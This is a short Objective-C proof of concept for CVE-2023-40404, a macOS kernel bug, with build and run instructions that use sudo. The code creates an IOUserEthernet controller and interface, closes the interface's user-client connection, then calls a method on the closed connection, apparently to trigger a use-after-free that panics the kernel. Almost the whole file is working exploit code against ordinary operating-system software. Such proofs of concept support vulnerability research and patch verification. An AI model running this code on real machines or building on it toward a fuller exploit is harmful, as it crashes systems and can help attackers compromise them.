#import <Foundation/Foundation.h>
#include <sys/socket.h>
#include <sys/ioccom.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <IOKit/IOCFSerialize.h>
#include <IOKit/IOCFUnserialize.h>
#include <IOSurface/IOSurfaceRef.h>

//CVE-2023-40404 poc
//clang poc.m -o poc -framework IOKit -framework Foundation
//sudo ./poc

void poc_panic(void){
    io_service_t IOUserEthernetResource_service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOUserEthernetResource"));
    io_connect_t IOUserEthernetResourceUserClient = 0;
    int kr = 0;
    kr = IOServiceOpen(IOUserEthernetResource_service, mach_task_self(), 0, &IOUserEthernetResourceUserClient);
    printf("IOUserEthernetResourceUserClient = %d\n", IOUserEthernetResourceUserClient);
    if(IOUserEthernetResourceUserClient==0){
        printf("try sudo\n");
        exit(0)
        ;    }
    IOObjectRelease(IOUserEthernetResource_service);
    
    CFMutableDictionaryRef controller_properties = CFDictionaryCreateMutable(NULL, 0, &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    uint32_t MinPacketSize=64;
    CFDictionarySetValue(controller_properties, CFSTR("MinPacketSize"),
                         CFNumberCreate(NULL, kCFNumberSInt32Type, &MinPacketSize));
    
    uint32_t MaxPacketSize=1024;
    CFDictionarySetValue(controller_properties, CFSTR("MaxPacketSize"),
                         CFNumberCreate(NULL, kCFNumberSInt32Type, &MaxPacketSize));
    
    uint8_t HardwareAddress[16];
    memcpy(HardwareAddress, "\x36\x23\xab\x2d\xe7\x40", 6);
    CFDictionarySetValue(controller_properties, CFSTR("HardwareAddress"),
                         CFDataCreate(NULL, HardwareAddress, 6));
    
    CFDictionarySetValue(controller_properties, CFSTR("NamePrefix"),
                         CFSTR("xLAN"));
    
    CFDataRef controller_data;
    controller_data = IOCFSerialize( controller_properties, kIOCFSerializeToBinary);
    uint64_t creat_controller_output = 0;
    uint32_t creat_controller_output_cnt = 1;
    kr = IOConnectCallMethod(IOUserEthernetResourceUserClient, 0, 0, 0, (void *)CFDataGetBytePtr(controller_data), CFDataGetLength(controller_data), &creat_controller_output, &creat_controller_output_cnt, 0,0);
    printf("creat controller (controller will create a new interface) -> 0x%x\n", kr);
    
    io_iterator_t iterator=0;
    IOServiceGetMatchingServices(kIOMainPortDefault, IOServiceMatching("IOUserEthernetInterface"), &iterator);
    io_service_t IOUserEthernetInterface_serive= IOIteratorNext(iterator);
    IOObjectRelease(iterator);
 
    io_connect_t networkUC = 0;
    kr = IOServiceOpen(IOUserEthernetInterface_serive, mach_task_self(), 0xFF000001, &networkUC);
    printf("kr =0x%x networkUC = %d IOUserEthernetInterface_serive=%d\n", kr, networkUC, IOUserEthernetInterface_serive);
    IOObjectRelease(IOUserEthernetInterface_serive);
    
    extern int IOCloseConnection(io_connect_t );
    IOCloseConnection(networkUC);
    IOServiceClose(IOUserEthernetResourceUserClient);
    
    getchar();
    char getNetworkDataHandle[128]={};
    strcpy(getNetworkDataHandle, "IONetworkStatsKey");;
    int getNetworkDataHandle_out = 0;
    size_t getNetworkDataHandle_out_len = 4;
    kr = IOConnectCallStructMethod(networkUC, 4, getNetworkDataHandle, 128, &getNetworkDataHandle_out, &getNetworkDataHandle_out_len);
    printf("getNetworkDataHandle kr = 0x%x %d\n", kr, getNetworkDataHandle_out);
    printf("no panic?\n");
}

int main(){
    poc_panic();
    return 0;
}
